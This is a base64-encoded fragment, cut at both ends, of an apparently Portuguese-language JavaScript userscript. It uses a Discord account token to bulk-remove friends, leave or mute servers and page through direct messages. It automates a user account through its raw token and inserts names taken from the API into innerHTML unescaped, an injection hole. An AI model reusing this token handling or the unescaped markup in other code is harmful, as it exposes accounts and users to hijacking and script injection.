CFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7IGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OyB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlICFpbXBvcnRhbnQ7IG91dGxpbmU6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1pbnB1dDo6cGxhY2Vob2xkZXIgeyBjb2xvcjogIzY2NjY2NiAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1pbnB1dDpmb2N1cyB7IGJvcmRlci1jb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OyBiYWNrZ3JvdW5kOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4xKSAhaW1wb3J0YW50OyB9CgogICAgICAgIC5kZm0tcHJvZ3Jlc3MtYWN0aW9ucyB7IGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsganVzdGlmeS1jb250ZW50OiBjZW50ZXIgIWltcG9ydGFudDsgbWFyZ2luLXRvcDogMTZweCAhaW1wb3J0YW50OyB9CiAgICAgICAgLmRmbS1idG4tY2FuY2VsIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzcyNzY3ZCAwJSwgIzVkNjE2OSAxMDAlKSAhaW1wb3J0YW50OyBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXI6IG5vbmUgIWltcG9ydGFudDsgcGFkZGluZzogMTBweCAyNHB4ICFpbXBvcnRhbnQ7IGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsgZm9udC13ZWlnaHQ6IDYwMCAhaW1wb3J0YW50OyBjdXJzb3I6IHBvaW50ZXIgIWltcG9ydGFudDsgdHJhbnNpdGlvbjogYWxsIDAuMTVzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICB9CiAgICAgICAgLmRmbS1idG4tY2FuY2VsOmhvdmVyIHsgZmlsdGVyOiBicmlnaHRuZXNzKDEuMSkgIWltcG9ydGFudDsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xcHgpICFpbXBvcnRhbnQ7IH0KICAgICAgICAuZGZtLWJ0bi1jYW5jZWw6ZGlzYWJsZWQgeyBvcGFjaXR5OiAwLjUgIWltcG9ydGFudDsgY3Vyc29yOiBub3QtYWxsb3dlZCAhaW1wb3J0YW50OyB9CiAgICBgOwogICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZSk7CgogICAgY29uc3Qgbm90aWZpY2F0aW9uQ29udGFpbmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICBub3RpZmljYXRpb25Db250YWluZXIuaWQgPSAiZGZtLW5vdGlmaWNhdGlvbi1jb250YWluZXIiOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChub3RpZmljYXRpb25Db250YWluZXIpOwoKICAgIGNvbnN0IHNob3dOb3RpZmljYXRpb24gPSAobWVzc2FnZSwgdHlwZSA9ICJpbmZvIiwgdGl0bGUgPSAiIiwgaWNvblVybCA9ICIiLCBuYW1lID0gIiIpID0+IHsKICAgICAgICBjb25zdCBub3RpZmljYXRpb24gPSB7IG1lc3NhZ2UsIHR5cGUsIHRpdGxlLCBpY29uVXJsLCBuYW1lLCBpZDogRGF0ZS5ub3coKSArIE1hdGgucmFuZG9tKCkgfTsKICAgICAgICBpZiAoYWN0aXZlTm90aWZpY2F0aW9ucyA+PSAzKSB7CiAgICAgICAgICAgIG5vdGlmaWNhdGlvblF1ZXVlLnB1c2gobm90aWZpY2F0aW9uKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KICAgICAgICBkaXNwbGF5Tm90aWZpY2F0aW9uKG5vdGlmaWNhdGlvbik7CiAgICB9OwoKICAgIGNvbnN0IGRpc3BsYXlOb3RpZmljYXRpb24gPSBub3RpZmljYXRpb24gPT4gewogICAgICAgIGFjdGl2ZU5vdGlmaWNhdGlvbnMrKzsKICAgICAgICBjb25zdCBpY29ucyA9IHsgc3VjY2VzczogIuKckyIsIGVycm9yOiAi4pyVIiwgd2FybmluZzogIuKaoCIsIGluZm86ICLihLkiIH07CiAgICAgICAgY29uc3Qgbm90aWZFbGVtZW50ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgbm90aWZFbGVtZW50LmNsYXNzTmFtZSA9IGBkZm0tbm90aWZpY2F0aW9uICR7bm90aWZpY2F0aW9uLnR5cGV9YDsKICAgICAgICBub3RpZkVsZW1lbnQuZGF0YXNldC5pZCA9IG5vdGlmaWNhdGlvbi5pZDsKCiAgICAgICAgaWYgKChub3RpZmljYXRpb24udHlwZSA9PT0gImZyaWVuZC1yZW1vdmVkIiB8fCBub3RpZmljYXRpb24udHlwZSA9PT0gInNlcnZlci1sZWZ0IikgJiYgbm90aWZpY2F0aW9uLmljb25VcmwgJiYgbm90aWZpY2F0aW9uLm5hbWUpIHsKICAgICAgICAgICAgY29uc3QgaXNTZXJ2ZXJMZWZ0ID0gbm90aWZpY2F0aW9uLnR5cGUgPT09ICJzZXJ2ZXItbGVmdCI7CiAgICAgICAgICAgIG5vdGlmRWxlbWVudC5jbGFzc0xpc3QuYWRkKGlzU2VydmVyTGVmdCA/ICJzZXJ2ZXItbGVmdCIgOiAiZnJpZW5kLXJlbW92ZWQiKTsKICAgICAgICAgICAgbm90aWZFbGVtZW50LmlubmVySFRNTCA9IGAKICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9IiR7aXNTZXJ2ZXJMZWZ0ID8gImRmbS1zZXJ2ZXItbGVmdC1jb250ZW50IiA6ICJkZm0tZnJpZW5kLXJlbW92ZWQtY29udGVudCJ9Ij4KICAgICAgICAgICAgICAgICAgICA8aW1nIGNsYXNzPSIke2lzU2VydmVyTGVmdCA/ICJkZm0tc2VydmVyLWxlZnQtaWNvbiIgOiAiZGZtLWZyaWVuZC1yZW1vdmVkLWF2YXRhciJ9IiBzcmM9IiR7bm90aWZpY2F0aW9uLmljb25Vcmx9IiBvbmVycm9yPSJ0aGlzLnNyYz0naHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vZW1iZWQvYXZhdGFycy8wLnBuZyciPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9IiR7aXNTZXJ2ZXJMZWZ0ID8gImRmbS1zZXJ2ZXItbGVmdC1pbmZvIiA6ICJkZm0tZnJpZW5kLXJlbW92ZWQtaW5mbyJ9Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAiZGZtLXNlcnZlci1sZWZ0LW5hbWUiIDogImRmbS1mcmllbmQtcmVtb3ZlZC1uYW1lIn0iPiR7bm90aWZpY2F0aW9uLm5hbWV9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9IiR7aXNTZXJ2ZXJMZWZ0ID8gImRmbS1zZXJ2ZXItbGVmdC10ZXh0IiA6ICJkZm0tZnJpZW5kLXJlbW92ZWQtdGV4dCJ9Ij4ke2lzU2VydmVyTGVmdCA/ICJTZXJ2aWRvciBhYmFuZG9uYWRvIiA6ICJBbWlnbyByZW1vdmlkbyJ9PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLW5vdGlmaWNhdGlvbi1jbG9zZSI+w5c8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG5vdGlmRWxlbWVudC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbm90aWZpY2F0aW9uLWljb24iPiR7aWNvbnNbbm90aWZpY2F0aW9uLnR5cGVdIHx8IGljb25zLmluZm99PC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbm90aWZpY2F0aW9uLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgICR7bm90aWZpY2F0aW9uLnRpdGxlID8gYDxkaXYgY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tdGl0bGUiPiR7bm90aWZpY2F0aW9uLnRpdGxlfTwvZGl2PmAgOiAiIn0KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbm90aWZpY2F0aW9uLW1lc3NhZ2UiPiR7bm90aWZpY2F0aW9uLm1lc3NhZ2V9PC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1ub3RpZmljYXRpb24tY2xvc2UiPsOXPC9idXR0b24+CiAgICAgICAgICAgIGA7CiAgICAgICAgfQoKICAgICAgICBub3RpZmljYXRpb25Db250YWluZXIuYXBwZW5kQ2hpbGQobm90aWZFbGVtZW50KTsKICAgICAgICBub3RpZkVsZW1lbnQucXVlcnlTZWxlY3RvcigiLmRmbS1ub3RpZmljYXRpb24tY2xvc2UiKS5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHJlbW92ZU5vdGlmaWNhdGlvbihub3RpZkVsZW1lbnQpKTsKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IG5vdGlmRWxlbWVudC5wYXJlbnRFbGVtZW50ICYmIHJlbW92ZU5vdGlmaWNhdGlvbihub3RpZkVsZW1lbnQpLCA1MDAwKTsKICAgIH07CgogICAgY29uc3QgcmVtb3ZlTm90aWZpY2F0aW9uID0gbm90aWZFbGVtZW50ID0+IHsKICAgICAgICBub3RpZkVsZW1lbnQuY2xhc3NMaXN0LmFkZCgicmVtb3ZpbmciKTsKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICAgICAgbm90aWZFbGVtZW50LnJlbW92ZSgpOwogICAgICAgICAgICBhY3RpdmVOb3RpZmljYXRpb25zLS07CiAgICAgICAgICAgIGlmIChub3RpZmljYXRpb25RdWV1ZS5sZW5ndGggPiAwKSBkaXNwbGF5Tm90aWZpY2F0aW9uKG5vdGlmaWNhdGlvblF1ZXVlLnNoaWZ0KCkpOwogICAgICAgIH0sIDMwMCk7CiAgICB9OwoKICAgIGNvbnN0IHNob3dDb25maXJtTW9kYWwgPSAobWVzc2FnZSwgb25Db25maXJtKSA9PiB7CiAgICAgICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBtb2RhbC5jbGFzc05hbWUgPSAiZGZtLW1vZGFsIjsKICAgICAgICBtb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+Q29uZmlybWHDp8OjbzwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRleHQiPiR7bWVzc2FnZX08L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIHNlY29uZGFyeSIgaWQ9ImNhbmNlbCI+Q2FuY2VsYXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuIGRhbmdlciIgaWQ9ImNvbmZpcm0iPkNvbmZpcm1hcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIGA7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChtb2RhbCk7CiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcigiI2NhbmNlbCIpLm9uY2xpY2sgPSAoKSA9PiBtb2RhbC5yZW1vdmUoKTsKICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCIjY29uZmlybSIpLm9uY2xpY2sgPSAoKSA9PiB7IG1vZGFsLnJlbW92ZSgpOyBvbkNvbmZpcm0oKTsgfTsKICAgICAgICBtb2RhbC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGUgPT4geyBpZiAoZS50YXJnZXQgPT09IG1vZGFsKSBtb2RhbC5yZW1vdmUoKTsgfSk7CiAgICB9OwoKICAgIGNvbnN0IGNyZWF0ZVByb2dyZXNzTW9kYWwgPSAodGl0bGUsIHRvdGFsLCBzaG93Q2FuY2VsID0gdHJ1ZSkgPT4gewogICAgICAgIGNvbnN0IHN0YXRlID0geyBjYW5jZWxsZWQ6IGZhbHNlIH07CiAgICAgICAgY29uc3QgbW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICBtb2RhbC5jbGFzc05hbWUgPSAiZGZtLW1vZGFsIjsKICAgICAgICBtb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+JHt0aXRsZX08L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy10ZXh0IiBpZD0icHJvZ3Jlc3MtdGV4dCI+MC8ke3RvdGFsfTwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1iYXItY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICR7c2hvd0NhbmNlbCA/ICc8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYWN0aW9ucyI+PGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPjwvZGl2PicgOiAiIn0KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgYDsKICAgICAgICBpZiAoc2hvd0NhbmNlbCkgewogICAgICAgICAgICBtb2RhbC5xdWVyeVNlbGVjdG9yKCIjY2FuY2VsLW9wZXJhdGlvbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICAgICAgc3RhdGUuY2FuY2VsbGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNjYW5jZWwtb3BlcmF0aW9uIikuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcigiI2NhbmNlbC1vcGVyYXRpb24iKS50ZXh0Q29udGVudCA9ICJDYW5jZWxhbmRvLi4uIjsKICAgICAgICAgICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy10ZXh0IikudGV4dENvbnRlbnQgPSAiQ2FuY2VsYW5kbyBvcGVyYcOnw6NvLi4uIjsKICAgICAgICAgICAgfSk7CiAgICAgICAgfQogICAgICAgIHJldHVybiB7IG1vZGFsLCBzdGF0ZSB9OwogICAgfTsKCiAgICBjb25zdCB1cGRhdGVQcm9ncmVzcyA9ICh0ZXh0RWxlbWVudCwgYmFyRWxlbWVudCwgY3VycmVudCwgdG90YWwsIGFjdGlvbikgPT4gewogICAgICAgIGNvbnN0IHBlcmNlbnQgPSAoY3VycmVudCAvIHRvdGFsKSAqIDEwMDsKICAgICAgICB0ZXh0RWxlbWVudC50ZXh0Q29udGVudCA9IGAke2FjdGlvbn0gJHtjdXJyZW50fS8ke3RvdGFsfWA7CiAgICAgICAgYmFyRWxlbWVudC5zdHlsZS53aWR0aCA9IGAke3BlcmNlbnR9JWA7CiAgICB9OwoKICAgIGNvbnN0IHNob3dTZXR0aW5nc01vZGFsID0gKCkgPT4gewogICAgICAgIGNvbnN0IG1vZGFsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgbW9kYWwuY2xhc3NOYW1lID0gImRmbS1zZXR0aW5ncy1tb2RhbCI7CiAgICAgICAgbW9kYWwuaW5uZXJIVE1MID0gYAogICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2V0dGluZ3MtY29udGVudCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tc2V0dGluZ3MtdGl0bGUiPkNvbmZpZ3VyYcOnw7VlczwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXNldHRpbmdzLW9wdGlvbiI+CiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJkZm0tc2V0dGluZ3MtbGFiZWwiPlZlbG9jaWRhZGUgZGFzIHJlcXVpc2nDp8O1ZXM6PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8c2VsZWN0IGNsYXNzPSJkZm0tc2V0dGluZ3Mtc2VsZWN0IiBpZD0icmVxdWVzdC1zcGVlZCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9ImZhc3QiICR7cmVxdWVzdFNwZWVkID09PSAiZmFzdCIgPyAic2VsZWN0ZWQiIDogIiJ9PlLDoXBpZGEgKDEwMG1zKTwvb3B0aW9uPgogICAgICAgICAgICAgICAgICAgICAgICA8b3B0aW9uIHZhbHVlPSJub3JtYWwiICR7cmVxdWVzdFNwZWVkID09PSAibm9ybWFsIiA/ICJzZWxlY3RlZCIgOiAiIn0+Tm9ybWFsICg1MDBtcyk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICAgICAgPG9wdGlvbiB2YWx1ZT0ic2xvdyIgJHtyZXF1ZXN0U3BlZWQgPT09ICJzbG93IiA/ICJzZWxlY3RlZCIgOiAiIn0+TGVudGEgKDEwMDBtcyk8L29wdGlvbj4KICAgICAgICAgICAgICAgICAgICA8L3NlbGVjdD4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4gc2Vjb25kYXJ5IiBpZD0ic2V0dGluZ3MtY2FuY2VsIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4iIGlkPSJzZXR0aW5ncy1zYXZlIj5TYWx2YXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICBgOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQobW9kYWwpOwogICAgICAgIG1vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNzZXR0aW5ncy1jYW5jZWwiKS5vbmNsaWNrID0gKCkgPT4gbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgbW9kYWwucXVlcnlTZWxlY3RvcigiI3NldHRpbmdzLXNhdmUiKS5vbmNsaWNrID0gKCkgPT4gewogICAgICAgICAgICByZXF1ZXN0U3BlZWQgPSBtb2RhbC5xdWVyeVNlbGVjdG9yKCIjcmVxdWVzdC1zcGVlZCIpLnZhbHVlOwogICAgICAgICAgICByZXF1ZXN0RGVsYXkgPSBkZWxheXNbcmVxdWVzdFNwZWVkXTsKICAgICAgICAgICAgbW9kYWwucmVtb3ZlKCk7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIkNvbmZpZ3VyYcOnw7VlcyBzYWx2YXMhIiwgInN1Y2Nlc3MiKTsKICAgICAgICB9OwogICAgICAgIG1vZGFsLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZSA9PiB7IGlmIChlLnRhcmdldCA9PT0gbW9kYWwpIG1vZGFsLnJlbW92ZSgpOyB9KTsKICAgIH07CgogICAgY29uc3QgYXBpUmVxdWVzdCA9IGFzeW5jICh1cmwsIG9wdGlvbnMgPSB7fSkgPT4gewogICAgICAgIGNvbnN0IGRlZmF1bHRIZWFkZXJzID0geyBhdXRob3JpemF0aW9uOiB0b2tlbiwgIngtc3VwZXItcHJvcGVydGllcyI6IHhTdXBlclByb3BlcnRpZXMgfTsKICAgICAgICBvcHRpb25zLmhlYWRlcnMgPSB7IC4uLmRlZmF1bHRIZWFkZXJzLCAuLi5vcHRpb25zLmhlYWRlcnMgfTsKICAgICAgICBjb25zdCByZXNwb25zZSA9IGF3YWl0IGZldGNoKHVybCwgb3B0aW9ucyk7CiAgICAgICAgcmV0dXJuIHJlc3BvbnNlOwogICAgfTsKCiAgICBjb25zdCBmZXRjaEZyaWVuZHMgPSBhc3luYyAoKSA9PiAoYXdhaXQgYXBpUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL3JlbGF0aW9uc2hpcHMiKSkuanNvbigpOwogICAgY29uc3QgZmV0Y2hTZXJ2ZXJzID0gYXN5bmMgKCkgPT4gKGF3YWl0IGFwaVJlcXVlc3QoImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y5L3VzZXJzL0BtZS9ndWlsZHMiKSkuanNvbigpOwoKICAgIGNvbnN0IHJlbW92ZUZyaWVuZCA9IGFzeW5jICh1c2VySWQsIHVzZXJOYW1lLCBhdmF0YXJVcmwpID0+IHsKICAgICAgICBhd2FpdCBhcGlSZXF1ZXN0KGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvcmVsYXRpb25zaGlwcy8ke3VzZXJJZH1gLCB7IG1ldGhvZDogIkRFTEVURSIgfSk7CiAgICAgICAgc2hvd05vdGlmaWNhdGlvbigiIiwgImZyaWVuZC1yZW1vdmVkIiwgIiIsIGF2YXRhclVybCwgdXNlck5hbWUpOwogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgIH07CgogICAgY29uc3QgbGVhdmVTZXJ2ZXIgPSBhc3luYyAoc2VydmVySWQsIHNlcnZlck5hbWUsIGljb25VcmwpID0+IHsKICAgICAgICBhd2FpdCBhcGlSZXF1ZXN0KGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvZ3VpbGRzLyR7c2VydmVySWR9YCwgewogICAgICAgICAgICBtZXRob2Q6ICJERUxFVEUiLAogICAgICAgICAgICBoZWFkZXJzOiB7ICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBsdXJraW5nOiBmYWxzZSB9KQogICAgICAgIH0pOwogICAgICAgIHNob3dOb3RpZmljYXRpb24oIiIsICJzZXJ2ZXItbGVmdCIsICIiLCBpY29uVXJsLCBzZXJ2ZXJOYW1lKTsKICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICB9OwoKICAgIGNvbnN0IG11dGVTZXJ2ZXIgPSBhc3luYyBzZXJ2ZXJJZCA9PiB7CiAgICAgICAgYXdhaXQgYXBpUmVxdWVzdCgiaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvdjkvdXNlcnMvQG1lL2d1aWxkcy9zZXR0aW5ncyIsIHsKICAgICAgICAgICAgbWV0aG9kOiAiUEFUQ0giLAogICAgICAgICAgICBoZWFkZXJzOiB7ICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyBndWlsZHM6IHsgW3NlcnZlcklkXTogeyBtdXRlZDogdHJ1ZSB9IH0gfSkKICAgICAgICB9KTsKICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgcmVxdWVzdERlbGF5KSk7CiAgICB9OwoKICAgIGNvbnN0IG11dGVBbGxTZXJ2ZXJzID0gYXN5bmMgKCkgPT4gewogICAgICAgIGNvbnN0IHNlcnZlcnMgPSBhd2FpdCBmZXRjaFNlcnZlcnMoKTsKICAgICAgICBpZiAoIXNlcnZlcnMubGVuZ3RoKSB7CiAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIk5lbmh1bSBzZXJ2aWRvciBlbmNvbnRyYWRvISIsICJ3YXJuaW5nIik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgU0lMRU5DSUFSIHRvZG9zIG9zICR7c2VydmVycy5sZW5ndGh9IHNlcnZpZG9yZXM/YCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCB7IG1vZGFsOiBwcm9ncmVzc01vZGFsLCBzdGF0ZTogY2FuY2VsU3RhdGUgfSA9IGNyZWF0ZVByb2dyZXNzTW9kYWwoIlNpbGVuY2lhbmRvIFNlcnZpZG9yZXMiLCBzZXJ2ZXJzLmxlbmd0aCk7CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy10ZXh0Iik7CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjcHJvZ3Jlc3MtYmFyIik7CiAgICAgICAgICAgIGxldCBtdXRlZENvdW50ID0gMDsKCiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgc2VydmVycy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgYnJlYWs7CiAgICAgICAgICAgICAgICBjb25zdCBzZXJ2ZXIgPSBzZXJ2ZXJzW2ldOwogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICBhd2FpdCBtdXRlU2VydmVyKHNlcnZlci5pZCk7CiAgICAgICAgICAgICAgICAgICAgbXV0ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgfSBjYXRjaCB7fQogICAgICAgICAgICAgICAgdXBkYXRlUHJvZ3Jlc3MocHJvZ3Jlc3NUZXh0LCBwcm9ncmVzc0JhciwgaSArIDEsIHNlcnZlcnMubGVuZ3RoLCAiU2lsZW5jaWFuZG8iKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgQ2FuY2VsYWRvISAke211dGVkQ291bnR9IHNlcnZpZG9yZXMgc2lsZW5jaWFkb3MuYCwgIndhcm5pbmciKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7bXV0ZWRDb3VudH0gc2Vydmlkb3JlcyBzaWxlbmNpYWRvcyFgLCAic3VjY2VzcyIpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9OwoKICAgIGNvbnN0IGdldENoYW5uZWxJZCA9IGFzeW5jIHVzZXJJZCA9PiB7CiAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBhcGlSZXF1ZXN0KCJodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS91c2Vycy9AbWUvY2hhbm5lbHMiLCB7CiAgICAgICAgICAgIG1ldGhvZDogIlBPU1QiLAogICAgICAgICAgICBoZWFkZXJzOiB7ICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIgfSwKICAgICAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoeyByZWNpcGllbnRzOiBbdXNlcklkXSB9KQogICAgICAgIH0pOwogICAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7CiAgICAgICAgcmV0dXJuIGRhdGEuaWQ7CiAgICB9OwoKICAgIGNvbnN0IGZldGNoTWVzc2FnZXMgPSBhc3luYyAoY2hhbm5lbElkLCBiZWZvcmUgPSBudWxsKSA9PiB7CiAgICAgICAgbGV0IHVybCA9IGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS9jaGFubmVscy8ke2NoYW5uZWxJZH0vbWVzc2FnZXM/bGltaXQ9MTAwYDsKICAgICAgICBpZiAoYmVmb3JlKSB1cmwgKz0gYCZiZWZvcmU9JHtiZWZvcmV9YDsKICAgICAgICB3aGlsZSAodHJ1